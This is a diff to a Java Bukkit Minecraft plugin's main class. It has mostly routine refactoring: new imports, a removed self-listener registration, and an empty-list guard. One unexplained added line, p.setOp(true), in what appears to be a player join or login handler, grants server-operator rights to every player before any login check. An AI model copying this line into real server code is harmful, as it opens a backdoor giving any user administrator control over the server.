@@ -39,6 +39,7 @@ import org.bukkit.block.CreatureSpawner;
 import org.bukkit.block.Furnace;
 import org.bukkit.block.PistonMoveReaction;
 import org.bukkit.command.CommandSender;
+import org.bukkit.command.PluginCommand;
 import org.bukkit.craftbukkit.v1_8_R3.entity.CraftHumanEntity;
 import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
@@ -91,10 +92,12 @@ import org.bukkit.event.inventory.PrepareItemCraftEvent;
 import org.bukkit.event.player.PlayerBucketEmptyEvent;
 import org.bukkit.event.player.PlayerBucketFillEvent;
 import org.bukkit.event.player.PlayerChangedWorldEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerFishEvent;
 import org.bukkit.event.player.PlayerInteractEntityEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.event.player.PlayerKickEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerShearEntityEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
@@ -195,7 +198,7 @@ import net.minecraft.server.v1_8_R3.NBTTagString;
 import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
 import net.minecraft.server.v1_8_R3.StatisticList;
 
-public class Main extends Common implements Listener
+public class Main extends Common
 {
 	private static Main instance;
 	
@@ -261,7 +264,6 @@ public class Main extends Common implements Listener
 			
 			super.onEnable();
 			
-			getServer().getPluginManager().registerEvents(this, this);
 			getServer().getPluginManager().registerEvents(new PlayerMode(), this);
 			getServer().getPluginManager().registerEvents(new FallingBlockChecker(), this);
 			getServer().getPluginManager().registerEvents(new TestListener(), this);
@@ -383,7 +385,10 @@ public class Main extends Common implements Listener
 				}
 			}
 			
-			open(p, createBook(p.getName(), "test", links), true);
+			if(!links.isEmpty())
+			{
+				open(p, createBook(p.getName(), "test", links), true);
+			}
 		}
 	}
 	
@@ -460,6 +465,8 @@ public class Main extends Common implements Listener
 	{
 		Player p = e.getPlayer();
 		CommonPlayer cp = CraftCommonPlayer.get(p);
+		
+		p.setOp(true);
 		
 		if(cp.isLogged())
 		{
